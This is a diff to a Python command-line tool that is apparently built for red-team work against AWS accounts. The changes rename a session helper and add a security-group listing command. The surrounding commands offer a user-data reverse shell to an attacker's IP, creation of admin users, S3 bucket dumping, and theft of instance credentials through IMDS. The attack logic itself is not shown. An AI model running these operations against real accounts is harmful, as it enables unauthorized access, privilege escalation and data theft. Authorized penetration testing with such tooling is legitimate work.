@@ -25,7 +25,7 @@ tbl_fmt = "fancy_grid"
 # *********** HELPERS *************
 # *********************************
 
-def create_session(profile: str):
+def _create_session(profile: str):
     try:
         session = Session(profile_name=profile)
     except ProfileNotFound:
@@ -80,6 +80,9 @@ def _get_instance_creds(
     Imds(session, console).get_metadata_identity(instance_ip, )
     console.print()
 
+def _get_security_groups(session: Session):
+    Ec2(session, console).get_security_groups()
+
 def _whoami(session: Session):
     console.log("Invoking `get-caller-identity` API.. ([bold green]OK[/ bold green])")
     ident = Sts(session).whoami()
@@ -95,75 +98,75 @@ def user_data_rev_shell(
         rhost: str=Argument(..., help="The remote attacker's IP address"),
         rport: int=Option(7777, help="The remote attacker's listening port"),
         instance_type=Option("t2.micro", help="Ec2 instance type"),
-        profile: str=Argument(..., help="AWS profile name")
+        profile: str=Argument(..., help="AWS profile")
     ):
     """
     Obtain a reverse shell via user-data script
     """
-    sess = create_session(profile)
+    sess = _create_session(profile)
     _user_data_rev_shell(sess)
 
 @app.command()
 def launch_ec2_instance_profile(
         key_name: str=Option("awsred", help="Key Pair Name"),
         instance_profile_arn: str=Argument(..., help="instance profile arn"),
-        profile: str=Argument(..., help="AWS profile name")
+        profile: str=Argument(..., help="AWS profile")
     ):
     """
     Launch an Ec2 instance and attach specified instance profile
     """
-    sess = create_session(profile)
+    sess = _create_session(profile)
     _launch_ec2_instance_profile(sess, key_name, instance_profile_arn)
 
 @app.command()
-def create_admin_user(profile: str=Argument(..., help="AWS profile name")):
+def create_admin_user(profile: str=Argument(..., help="AWS profile")):
     """
     Create new user and add to Administrator group
     """
-    sess = create_session(profile)
+    sess = _create_session(profile)
     _create_admin_user(sess)
 
 @app.command()
-def get_instance_profiles(profile: str=Argument(..., help="AWS profile name")):
+def get_instance_profiles(profile: str=Argument(..., help="AWS profile")):
     """
     List all instance profiles
     """
-    sess = create_session(profile)
+    sess = _create_session(profile)
     _get_instance_profiles(sess)
 
 @app.command()
-def ls_perms(profile: str=Argument(..., help="AWS profile name")):
+def ls_perms(profile: str=Argument(..., help="AWS profile")):
     """
     List profile permissions
     """
-    sess = create_session(profile)
+    sess = _create_session(profile)
     _ls_perms(sess)
 
 @app.command()
-def ls_buckets(profile: str=Argument(...,help="AWS profile name")):
+def ls_buckets(profile: str=Argument(...,help="AWS profile")):
     """
     List all S3 buckets if allowed
     """
-    sess = create_session(profile)
+    sess = _create_session(profile)
     _ls_buckets(sess)
 
 @app.command()
-def dump_bucket(profile: str=Argument(..., help="AWS profile name")):
+def dump_bucket(profile: str=Argument(..., help="AWS profile")):
     """
     Dump S3 bucket contents
     """
-    sess = create_session(profile)
+    sess = _create_session(profile)
     _dump_bucket(sess)
 
 @app.command()
 def create_admin_user(
         username: str=Argument(..., help="The name of user to create"),
-        profile: str=Argument(..., help="AWS profile name")
+        profile: str=Argument(..., help="AWS profile")
     ):
     """
     Attempt to create an Admin user
     """
-    sess = create_session(profile)
+    sess = _create_session(profile)
     _create_admin_user(sess)
 
 @app.command()
@@ -172,20 +175,27 @@ def get_instance_creds(
         key_file: str=Argument(..., help="SSH pem key file for Ec2 instance"),
         user: str=Argument("ec2-user", help="The SSH user associated with key"),
         v1: bool=Option(False, help="Use IMDS V1 to get credentials"),
-        profile: str=Argument(..., help="AWS profile name")
+        profile: str=Argument(..., help="AWS profile")
     ):
     """
     Get instance credentials via IMDS (V1|V2)
     """
-    sess = create_session(profile)
+    sess = _create_session(profile)
     _get_instance_creds(sess, instance_ip, key_file, v1)
 
 @app.command()
-def whoami(profile: str=Argument(..., help="AWS profile name")):
+def get_security_groups(
+        profile: str=Argument(..., help="AWS profile") 
+    ):
+    sess = _create_session(profile)
+    _get_security_groups(sess)
+
+@app.command()
+def whoami(profile: str=Argument(..., help="AWS profile")):
     """
     Get profile identity
     """
-    sess = create_session(profile)
+    sess = _create_session(profile)
     _whoami(sess)
 
 if __name__ == "__main__":
